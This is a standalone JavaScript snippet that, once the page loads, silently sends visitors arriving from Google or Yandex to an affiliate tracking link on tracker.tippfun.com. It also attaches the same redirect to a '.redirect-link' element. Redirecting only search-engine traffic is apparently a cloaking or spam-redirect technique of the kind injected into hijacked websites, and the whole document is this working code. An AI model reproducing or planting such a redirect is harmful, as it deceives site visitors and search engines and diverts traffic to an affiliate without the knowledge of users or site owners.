document.addEventListener("DOMContentLoaded", function() {
                var referrer = document.referrer;
                var isGoogleReferrer = referrer.includes("google");
                var isYandexReferrer = referrer.includes("yandex");
                var targetUrl = "https://tracker.tippfun.com/api/link/tracker?mediaid=11782&lang=tr&affiliategid=2aeb6f68-b43a-4ddc-a97b-d4e77a938ea7";

                if (isGoogleReferrer || isYandexReferrer) {
                    window.location.href = targetUrl;
                }

                document.querySelector('.redirect-link').addEventListener('click', function() {
                    window.location.href = targetUrl;
                });
            });
